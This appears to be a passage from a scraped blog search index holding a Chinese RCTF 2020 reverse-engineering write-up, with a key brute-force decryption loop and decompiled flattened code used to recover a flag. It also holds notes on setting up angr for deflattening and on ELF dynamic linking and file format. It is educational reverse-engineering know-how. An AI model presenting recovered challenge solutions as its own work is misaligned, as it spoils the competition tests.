0x3d) + (c1 \u003e\u003e 3)); c2 ^= t2s[cycle]; c2 -= c1; c2 = (c2 \u003c\u003c 8) + (c2 \u003e\u003e 0x38); /*t1 = ((t1 \u003e\u003e 8) + (t1 \u003c\u003c 0x38) + t2) ^ (longlong)cycle; t2 = ((t2 \u003e\u003e 0x3d) + (t2 \u003c\u003c 3)) ^ t1;*/ } //c2 = (p2\u003e\u003e 8) + (p2\u003c\u003c 0x38) + p1 ^ t2; //c1 = (p1 \u003e\u003e 0x3d) + (p1 \u003c\u003c 3) ^ c2; c1 ^= c2; c1 = ((c1 \u003c\u003c 0x3d) + (c1 \u003e\u003e 3)); c2 ^= k2; c2 -= c1; c2 = (c2 \u003c\u003c 8) + (c2 \u003e\u003e 0x38); *(ulonglong *)plain = c1; *(ulonglong *)(plain + 8) = c2; } unsigned char cipherText[100]{ 0xc1,0x77,0x1d,0xe1,0x2b,0xf8,0x00,0x2a,0xf4,0x91,0xd5,0x23,0xfc,0x71,0xb1,0xc3, //0x57,0x59,0x88,0xc2,0x8b,0x1e,0xf1,0x30,0x75,0xeb,0x2f,0x42,0x77,0xab,0x94,0xd5 //0xb9,0x98,0x6e,0x46,0xf0,0x76,0x5d,0xe1,0xf2,0x36,0x77,0x5d,0xb5,0xfd,0x51,0xb6 }; char dePlain[100]={0}; int main() { for(ulonglong i=0;i\u003c=0xFFFF;i++) { ulonglong k1=0,k2=(i\u003c\u003c48); decrypt(k1,k2,(char*)cipherText,dePlain); for(int i=0;i\u003c16;i++) { printf(\"%s\\n\",dePlain); } } return 0; } ","date":"2020-06-06","objectID":"/rctf2020-%E9%83%A8%E5%88%86re/:2:0","tags":null,"title":"RCTF2020-部分re","uri":"/rctf2020-%E9%83%A8%E5%88%86re/"},{"categories":["writeup"],"content":"play_the_game get flag的部分在libcalculate.so里面，so文件被平坦化了，本来想用angr去一下平坦化看看，但是发现好像不行。 flag是dword_2B00C的md5值，这个值只在sub_76B0中被修改过，调试起来发现只有下棋赢了的时候这个值才会改变，然后只有当dword_2B008的值大于等于0x13f4f9f9的时候才会printlog出flag，因为这两个值只在sub76B0中被修改过了，所以直接dump出这个函数输出dword_2B008输出大于等于0x13f4f9f9时dword_2B00C的值即可。 #include\u003cmath.h\u003e #include\u003cstdio.h\u003e int dword_2B008 = 0x13F4E6A3; int dword_2B00C = 0xDEF984B1; int sub_76B0() { signed int v0; // r1 char v1; // r2 signed int v2; // r1 signed int v3; // r12 signed int v4; // lr signed int v5; // r1 signed int v6; // r2 signed int v7; // r3 signed int v8; // r1 char v9; // r2 signed int v10; // r1 signed int v11; // r12 signed int v12; // lr signed int v13; // r1 signed int v14; // r2 signed int v15; // r3 signed int v16; // r1 signed int v17; // r12 signed int v18; // lr signed int v19; // r1 char v20; // lr signed int v21; // r2 signed int v22; // r3 signed int v23; // r1 signed int v24; // r1 signed int v25; // r12 signed int v26; // lr signed int v27; // r1 char v28; // lr signed int v29; // r2 signed int v30; // r3 signed int v31; // r1 signed int v32; // r1 signed int v33; // r12 signed int v34; // lr signed int v35; // r1 signed int v36; // r2 signed int v37; // r3 signed int v38; // r1 signed int v39; // r2 signed int v40; // r3 signed int v41; // r1 signed int v42; // r12 signed int v43; // lr signed int v44; // r1 signed int v45; // r12 signed int v46; // lr signed int v47; // r1 signed int v48; // r2 signed int v49; // r3 signed int v50; // r1 signed int v51; // r2 signed int v52; // r3 signed int v53; // r1 signed int v54; // r2 signed int v55; // r3 signed int v57; // [sp+14h] [bp-7Ch] int v58; // [sp+18h] [bp-78h] signed int v59; // [sp+6Ch] [bp-24h] char v60; // [sp+76h] [bp-1Ah] char v61; // [sp+77h] [bp-19h] v59 = (signed int)((sqrt((double)(8 * (dword_2B008 - 0x13F4E6A3) + 1)) - 1.0) / 2.0 + 1.0); dword_2B008 += v59; v58 = dword_2B008 % 4; v57 = 329878480; while ( 1 ) { while ( 1 ) { while ( 1 ) { while ( 1 ) { while ( 1 ) { while ( 1 ) { while ( 1 ) { while ( 1 ) { while ( 1 ) { while ( 1 ) { while ( 1 ) { while ( 1 ) { while ( 1 ) { while ( 1 ) { while ( v57 == -1902481392 ) { v2 = 982494985; v3 = 0; v3 = 1; v4 = 0; v4 = 1; if ( (v3 \u0026 1 ^ v4 \u0026 1 | ~(~v3 | ~v4) \u0026 1) \u0026 1 ) v2 = 631845012; v57 = v2; } if ( v57 != -1839432635 ) break; v31 = -662380450; if ( v61 \u0026 1 ) v31 = -356495000; v57 = v31; } if ( v57 != -1690025818 ) break; v57 = 972960622; } if ( v57 != -1673856231 ) break; v57 = 1037163223; } if ( v57 != -1492608071 ) break; v57 = 973492237; } if ( v57 != -1424285714 ) break; v57 = -662380450; } if ( v57 != -1252652544 ) break; v38 = 834798273; v39 = 0; v39 = 1; v40 = 0; v40 = 1; if ( (v39 \u0026 v40 | v39 ^ v40) \u0026 1 ) v38 = 1385700430; v57 = v38; } if ( v57 != -1086664836 ) break; v13 = 1181698316; dword_2B00C *= v59; v14 = 0; v14 = 1; v15 = 0; v15 = 1; if ( (v14 \u0026 v15 | v14 ^ v15) \u0026 1 ) v13 = -854969644; v57 = v13; } if ( v57 != -981935185 ) break; dword_2B00C \u003c\u003c= v59 % 8; v57 = -1252652544; } if ( v57 != -854969644 ) break; v57 = 2074254629; } if ( v57 != -744507517 ) break; v35 = -435027630; dword_2B00C += dword_2B008; v36 = 0; v36 = 1; v37 = 0; v37 = 1; if ( (v36 \u0026 v37 | v36 ^ v37) \u0026 1 ) v35 = -1424285714; v57 = v35; } if ( v57 != -662380450 ) break; v57 = -1252652544; } if ( v57 != -435027630 ) break; dword_2B00C += dword_2B008; v57 = -744507517; } if ( v57 != -356495000 ) break; v32 = -435027630; v33 = 0; v33 = 1; v34 = 0; v34 = 1; if ( (~v33 ^ ~v34 | ~(~v33 | ~v34) \u0026 1) \u0026 1 ) v32 = -744507517; v57 = v32; } if ( v57 == -7797833 ) break; switch ( v57 ) { case 187395956: v10 = 1181698316; v11 = 0; v11 = 1; v12 = 0; v12 = 1; if ( (v11 \u0026 1 ^ v12 \u0026 1 | ~(~v11 | ~v12) \u0026 1) \u0026 1 ) v10 = -1086664836; v57 = v10; break; case 329878480: v0 = 564872742; v1 = 0; if ( !(dword_2B008 % 4) ) v1 = 1; if ( v1 \u0026 1 ) v0 = -1902481392; v57 = v0; break; case 413793462: v57 = 973492237; break; case 475330195: v57 = 1549997554; break; case 564872742: v8 = 963397217; v9 = 0; if ( v58 == 1 ) v9 = 1; if ( v9 \u0026 1 ) v8 = 1873","date":"2020-06-06","objectID":"/rctf2020-%E9%83%A8%E5%88%86re/:3:0","tags":null,"title":"RCTF2020-部分re","uri":"/rctf2020-%E9%83%A8%E5%88%86re/"},{"categories":["notes"],"content":"rctf的那道play the game对安卓native文件用了平坦化的混淆，我开始准备用Bird的脚本去掉平坦化的，但是失败了，因为angr、python的各种原因环境搭建的并不顺利，最后搭建起来了但是没能去掉混淆，不过还是记录一下环境搭建的过程。(不过我这篇里面写的这个工程是可以的，比赛的时候用的那个应该是有点问题) ","date":"2020-06-06","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%85%AD%E5%A4%A9-%E5%8E%BB%E5%B9%B3%E5%9D%A6%E5%8C%96%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/:0:0","tags":null,"title":"去平坦化环境搭建","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%85%AD%E5%A4%A9-%E5%8E%BB%E5%B9%B3%E5%9D%A6%E5%8C%96%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["notes"],"content":"Tips 选择python3选择python3选择python3 重要的事情说三遍 ","date":"2020-06-06","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%85%AD%E5%A4%A9-%E5%8E%BB%E5%B9%B3%E5%9D%A6%E5%8C%96%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/:1:0","tags":null,"title":"去平坦化环境搭建","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%85%AD%E5%A4%A9-%E5%8E%BB%E5%B9%B3%E5%9D%A6%E5%8C%96%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["notes"],"content":"安装virtualenvwrapper # 安装 python3 -m pip install virtualenvwrapper # 修改~/.bashrc文件，将下面的内容加入~/.bashrc export VIRTUALENVWRAPPER_PYTHON=/usr/local/bin/python3 export WORKON_HOME=~/Envs source /usr/local/bin/virtualenvwrapper.sh # 修改完成 source ~/.bashrc # 创建一个虚拟环境 mkvirtualenv env-angr # 再记录一些virtualenv的基本操作 # 指定python版本 mkvirtualenv --python=/usr/local/python3.5.3/bin/python venv # 查看当前虚拟环境 workon # 虚拟环境直接的切换 workon env-angr # 退出虚拟环境 deactivate # 删除虚拟环境 rmvirtualenv venv windows下的参考这个: https://blog.csdn.net/huangbx_tx/article/details/80683515 ","date":"2020-06-06","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%85%AD%E5%A4%A9-%E5%8E%BB%E5%B9%B3%E5%9D%A6%E5%8C%96%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/:2:0","tags":null,"title":"去平坦化环境搭建","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%85%AD%E5%A4%A9-%E5%8E%BB%E5%B9%B3%E5%9D%A6%E5%8C%96%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["notes"],"content":"安装angr python3 -m pip install angr # 如果很慢的话可以换个源 # python3 -m pip install -i https://pypi.tuna.tsinghua.edu.cn/simple angr ","date":"2020-06-06","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%85%AD%E5%A4%A9-%E5%8E%BB%E5%B9%B3%E5%9D%A6%E5%8C%96%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/:3:0","tags":null,"title":"去平坦化环境搭建","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%85%AD%E5%A4%A9-%E5%8E%BB%E5%B9%B3%E5%9D%A6%E5%8C%96%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["notes"],"content":"去除平坦化 https://github.com/cq674350529/deflat 直接按照这个github上面写的运行即可，里面还有一个可以用来去除虚假控制流的，但是我用在这个so文件上的效果并不好，去除平坦化的效果还是可以的。 ","date":"2020-06-06","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%85%AD%E5%A4%A9-%E5%8E%BB%E5%B9%B3%E5%9D%A6%E5%8C%96%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/:4:0","tags":null,"title":"去平坦化环境搭建","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%85%AD%E5%A4%A9-%E5%8E%BB%E5%B9%B3%E5%9D%A6%E5%8C%96%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"categories":["notes"],"content":"什么是PLT和GOT  GOT全称Global Offset Table，即全局偏移量表。它在可执行文件中是一个单独的section，位于.data section的前面。每个被目标模块引用的全局符号（函数或者变量）都对应于GOT中一个8字节的条目。编译器还为GOT中每个条目生成一个重定位记录。在加载时，动态链接器会重定位GOT中的每个条目，使得它包含正确的目标地址。 PLT全称Procedure Linkage Table，即过程链接表。它在可执行文件中也是一个单独的section，位于.textsection的前面。每个被可执行程序调用的库函数都有它自己的PLT条目。每个条目实际上都是一小段可执行的代码。 ","date":"2020-05-27","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%9B%9B%E5%A4%A9-elf%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/:1:0","tags":null,"title":"ELF动态链接","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%9B%9B%E5%A4%A9-elf%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/"},{"categories":["notes"],"content":".got 这是我们常说的GOT, 即Global Offset Table, 全局偏移表. 这是链接器在执行链接时 实际上要填充的部分, 保存了所有外部符号的地址信息. 不过值得注意的是, 在i386架构下, 除了每个函数占用一个GOT表项外，GOT表项还保留了 3个公共表项, 每项32位(4字节), 保存在前三个位置, 分别是: got[0]: 本ELF动态段(.dynamic段)的装载地址 got[1]: 本ELF的link_map数据结构描述符地址 got[2]: _dl_runtime_resolve函数的地址 其中, link_map数据结构的定义如下: struct link_map { /* Shared library's load address. */ ElfW(Addr) l_addr; /* Pointer to library's name in the string table. */ char *l_name; /* Dynamic section of the shared object. Includes dynamic linking info etc. Not interesting to us. */ ElfW(Dyn) *l_ld; /* Pointer to previous and next link_map node. */ struct link_map *l_next, *l_prev; }; ","date":"2020-05-27","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%9B%9B%E5%A4%A9-elf%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/:1:1","tags":null,"title":"ELF动态链接","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%9B%9B%E5%A4%A9-elf%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/"},{"categories":["notes"],"content":".plt 这也是我们常说的PLT, 即Procedure Linkage Table, 进程链接表. 这个表里包含了一些代码, 用来(1)调用链接器来解析某个外部函数的地址, 并填充到.got.plt中, 然后跳转到该函数; 或者 (2)直接在.got.plt中查找并跳转到对应外部函数(如果已经填充过). ","date":"2020-05-27","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%9B%9B%E5%A4%A9-elf%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/:1:2","tags":null,"title":"ELF动态链接","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%9B%9B%E5%A4%A9-elf%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/"},{"categories":["notes"],"content":".got.plt .got.plt相当于.plt的GOT全局偏移表, 其内容有两种情况： 1)如果在之前查找过该符号, 内容为外部函数的具体地址. 2)如果没查找过, 则内容为跳转回.plt的代码, 并执行查找. ld-linux-x86-64.so.2 是一个动态链接库，负责查找程序所使用的函数绝对地址，并将其写入到GOT表中，以供后续调用。其中GOT[0]为空，GOT[1]和GOT[2]用于保存查找的绝对函数地址，GOT[1]保存的是一个地址，指向已经加载的共享库的链表地址；GOT[2]保存的是一个函数的地址，定义如下：GOT[2] = \u0026_dl_runtime_resolve，这个函数的主要作用就是找到某个符号的地址，并把它写到与此符号相关的GOT项中，然后将控制转移到目标函数，而后面的GOT[3]，GOT[4]…都是通过_dl_fixup 添加的。 ","date":"2020-05-27","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%9B%9B%E5%A4%A9-elf%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/:1:3","tags":null,"title":"ELF动态链接","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%9B%9B%E5%A4%A9-elf%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/"},{"categories":["notes"],"content":"函数第一次被调用的过程 第一步由函数调用跳入到PLT表中，然后第二步PLT表跳到GOT表中，可以看到第三步由GOT表回跳到PLT表中，这时候进行压栈，把代表函数的ID压栈，接着第四步跳转到公共的PLT表项中，第5步进入到GOT表中，然后_dl_runtime_resolve对动态函数进行地址解析和重定位，第七步把动态函数真实的地址写入到GOT表项中，然后执行函数并返回。 解释下dynamic段，link_map和_dl_runtime_resolve dynamic段：提供动态链接的信息，例如动态链接中各个表的位置 link_map：已加载库的链表，由动态库函数的地址构成的链表 _dl_runtime_resolve：在第一次运行时进行地址解析和重定位工作 ","date":"2020-05-27","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%9B%9B%E5%A4%A9-elf%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/:1:4","tags":null,"title":"ELF动态链接","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%9B%9B%E5%A4%A9-elf%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/"},{"categories":["notes"],"content":"函数后来被调用的过程 可以看到，第一步还是由函数调用跳入到PLT表，但是第二步跳入到GOT表中时，由于这个时候该表项已经是动态函数的真实地址了，所以可以直接执行然后返回。 对于动态函数的调用，第一次要经过地址解析和回写到GOT表项中，第二次直接调用即可 ","date":"2020-05-27","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%9B%9B%E5%A4%A9-elf%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/:1:5","tags":null,"title":"ELF动态链接","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%9B%9B%E5%A4%A9-elf%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/"},{"categories":["notes"],"content":"参考链接 https://github.com/tinyclub/open-c-book/blob/master/zh/chapters/02-chapter4.markdown https://luomuxiaoxiao.com/?p=578 https://www.cnblogs.com/pannengzhi/p/2018-04-09-about-got-plt.html https://www.jianshu.com/p/0ac63c3744dd ","date":"2020-05-27","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%9B%9B%E5%A4%A9-elf%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/:2:0","tags":null,"title":"ELF动态链接","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%9B%9B%E5%A4%A9-elf%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/"},{"categories":["notes"],"content":"ELF文件组成 ELF头部(ELF_Header): 每个ELF文件都必须存在一个ELF_Header,这里存放了很多重要的信息用来描述整个文件的组织,如: 版本信息,入口信息,偏移信息等。程序执行也必须依靠其提供的信息。 程序头部表(Program_Header_Table): 可选的一个表，用于告诉系统如何在内存中创建映像,在图中也可以看出来,有程序头部表才有段,有段就必须有程序头部表。其中存放各个段的基本信息(包括地址指针)。 节区头部表(Section_Header_Table): 类似与Program_Header_Table,但与其相对应的是节区(Section)。 节区(Section): 将文件分成一个个节区，每个节区都有其对应的功能，如符号表，哈希表等。 段(Segment): 将文件分成一段一段映射到内存中。段中通常包括一个或多个节区。 ","date":"2020-05-25","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%89%E5%A4%A9-elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/:1:0","tags":null,"title":"ELF文件组成","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%89%E5%A4%A9-elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/"},{"categories":["notes"],"content":"ELF头 $ readelf -h main ELF Header: Magic: 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 Class: ELF64 Data: 2's complement, little endian Version: 1 (current) OS/ABI: UNIX - System V ABI Version: 0 Type: DYN (Shared object file) Machine: Advanced Micro Devices X86-64 Version: 0x1 Entry point address: 0x660 Start of program headers: 64 (bytes into file) Start of section headers: 6616 (bytes into file) Flags: 0x0 Size of this header: 64 (bytes) Size of program headers: 56 (bytes) Number of program headers: 9 Size of section headers: 64 (bytes) Number of section headers: 29 Section header string table index: 28 /* ELF Header */ #define EI_NIDENT 16 typedef struct elfhdr { unsigned char e_ident[EI_NIDENT]; /* ELF Identification */ Elf32_Half e_type; /* object file type */ Elf32_Half e_machine; /* machine */ Elf32_Word e_version; /* object file version */ Elf32_Addr e_entry; /* virtual entry point */ Elf32_Off e_phoff; /* program header table offset */ Elf32_Off e_shoff; /* section header table offset */ Elf32_Word e_flags; /* processor-specific flags */ Elf32_Half e_ehsize; /* ELF header size */ Elf32_Half e_phentsize; /* program header entry size */ Elf32_Half e_phnum; /* number of program header entries */ Elf32_Half e_shentsize; /* section header entry size */ Elf32_Half e_shnum; /* number of section header entries */ Elf32_Half e_shstrndx; /* section header table's \"section header string table\" entry offset */ } Elf32_Ehdr; typedef struct { unsigned char e_ident[EI_NIDENT]; /* Id bytes */ Elf64_Quarter e_type; /* file type */ Elf64_Quarter e_machine; /* machine type */ Elf64_Half e_version; /* version number */ Elf64_Addr e_entry; /* entry point */ Elf64_Off e_phoff; /* Program hdr offset */ Elf64_Off e_shoff; /* Section hdr offset */ Elf64_Half e_flags; /* Processor flags */ Elf64_Quarter e_ehsize; /* sizeof ehdr */ Elf64_Quarter e_phentsize; /* Program header entry size */ Elf64_Quarter e_phnum; /* Number of program headers */ Elf64_Quarter e_shentsize; /* Section header entry size */ Elf64_Quarter e_shnum; /* Number of section headers */ Elf64_Quarter e_shstrndx; /* String table index */ } Elf64_Ehdr; e_ident字段含义 ELF Header 中各个字段的说明如表： ","date":"2020-05-25","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%89%E5%A4%A9-elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/:2:0","tags":null,"title":"ELF文件组成","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%89%E5%A4%A9-elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/"},{"categories":["notes"],"content":"程序头 ep@EP:/mnt/d/code/linux$ readelf -l main Elf file type is DYN (Shared object file) Entry point 0x660 There are 9 program headers, starting at offset 64 Program Headers: Type Offset VirtAddr PhysAddr FileSiz MemSiz Flags Align PHDR 0x0000000000000040 0x0000000000000040 0x0000000000000040 0x00000000000001f8 0x00000000000001f8 R 0x8 INTERP 0x0000000000000238 0x0000000000000238 0x0000000000000238 0x000000000000001c 0x000000000000001c R 0x1 [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2] LOAD 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x00000000000009e8 0x00000000000009e8 R E 0x200000 LOAD 0x0000000000000d98 0x0000000000200d98 0x0000000000200d98 0x0000000000000278 0x0000000000000280 RW 0x200000 DYNAMIC 0x0000000000000da8 0x0000000000200da8 0x0000000000200da8 0x00000000000001f0 0x00000000000001f0 RW 0x8 NOTE 0x0000000000000254 0x0000000000000254 0x0000000000000254 0x0000000000000044 0x0000000000000044 R 0x4 GNU_EH_FRAME 0x00000000000008a4 0x00000000000008a4 0x00000000000008a4 0x000000000000003c 0x000000000000003c R 0x4 GNU_STACK 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 RW 0x10 GNU_RELRO 0x0000000000000d98 0x0000000000200d98 0x0000000000200d98 0x0000000000000268 0x0000000000000268 R 0x1 Section to Segment mapping: Segment Sections... 00 01 .interp 02 .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn .rela.plt .init .plt .plt.got .text .fini .rodata .eh_frame_hdr .eh_frame 03 .init_array .fini_array .dynamic .got .data .bss 04 .dynamic 05 .note.ABI-tag .note.gnu.build-id 06 .eh_frame_hdr 07 08 .init_array .fini_array .dynamic .got 可执行文件或者共享目标文件的程序头部是一个结构数组，每个结构描述了一个段 或者系统准备程序执行所必需的其它信息。目标文件的“段”包含一个或者多个“节区”， 也就是“段内容(Segment Contents)”。程序头部仅对于可执行文件和共享目标文件 有意义。 可执行目标文件在 ELF 头部的 e_phentsize和e_phnum 成员中给出其自身程序头部 的大小。程序头部的数据结构: /* Program Header */ typedef struct { Elf32_Word p_type; /* segment type */ Elf32_Off p_offset; /* segment offset */ Elf32_Addr p_vaddr; /* virtual address of segment */ Elf32_Addr p_paddr; /* physical address - ignored? */ Elf32_Word p_filesz; /* number of bytes in file for seg. */ Elf32_Word p_memsz; /* number of bytes in mem. for seg. */ Elf32_Word p_flags; /* flags */ Elf32_Word p_align; /* memory alignment */ } Elf32_Phdr; typedef struct { Elf64_Half p_type; /* entry type */ Elf64_Half p_flags; /* flags */ Elf64_Off p_offset; /* offset */ Elf64_Addr p_vaddr; /* virtual address */ Elf64_Addr p_paddr; /* physical address */ Elf64_Xword p_filesz; /* file size */ Elf64_Xword p_memsz; /* memory size */ Elf64_Xword p_align; /* memory \u0026 file alignment */ } Elf64_Phdr; 其中各个字段说明： p_offset 此成员给出从文件头到该段第一个字节的偏移。 p_vaddr 此成员给出段的第一个字节将被放到内存中的虚拟地址。 p_paddr 此成员仅用于与物理地址相关的系统中。因为 System V 忽略所有应用程序的物理地址信息，此字段对与可执行文件和共享目标文件而言具体内容是指定的。 p_filesz 此成员给出段在文件映像中所占的字节数。可以为 0。 p_memsz 此成员给出段在内存映像中占用的字节数。可以为 0。 p_flags 此成员给出与段相关的标志。 p_align 可加载的进程段的 p_vaddr 和 p_offset 取值必须合适，相对于对页面大小的取模而言。此成员给出段在文件中和内存中如何 对齐。数值 0 和 1 表示不需要对齐。否则 p_align 应该是个正整数，并且是 2 的幂次数，p_vaddr 和 p_offset 对 p_align 取模后应该相等。 p_type 此数组元素描述的段的类型，或者如何解释此数组元素的信息。具体如下图。 ","date":"2020-05-25","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%89%E5%A4%A9-elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/:3:0","tags":null,"title":"ELF文件组成","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%89%E5%A4%A9-elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/"},{"categories":["notes"],"content":"PT_LOAD 一个可执行文件至少有一个PT_LOAD 类型的段。这类程序头描述的是可装载的段，也就是说，这种类型的段将被装载或者映射到内存中。例如，一个需要动态链接的ELF 可执行文件通常包含以下两个可装载的段（类型为PT_LOAD）： 存放程序代码的text 段； 存放全局变量和动态链接信息的data 段。 ","date":"2020-05-25","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%89%E5%A4%A9-elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/:3:1","tags":null,"title":"ELF文件组成","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%89%E5%A4%A9-elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/"},{"categories":["notes"],"content":"PT_DYNAMIC——动态段的Phdr 动态段是动态链接可执行文件所特有的，包含了动态链接器所必需的一些信息。在动态段中包含了一些标记值和指针，包括但不限于以下内容： 运行时需要链接的共享库列表； 全局偏移表（GOT）的地址 重定位条目的相关信息。 ","date":"2020-05-25","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%89%E5%A4%A9-elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/:3:2","tags":null,"title":"ELF文件组成","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%89%E5%A4%A9-elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/"},{"categories":["notes"],"content":"PT_INTERP PT_INTERP 段只将位置和大小信息存放在一个以null 为终止符的字符串中，是对程序解释器位置的描述。例如，/lib/linux-ld.so.2 一般是指动态链接器的位置，也即程序解释器的位置。 ","date":"2020-05-25","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%89%E5%A4%A9-elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/:3:3","tags":null,"title":"ELF文件组成","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%89%E5%A4%A9-elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/"},{"categories":["notes"],"content":"PT_PHDR PT_PHDR 段保存了程序头表本身的位置和大小。Phdr 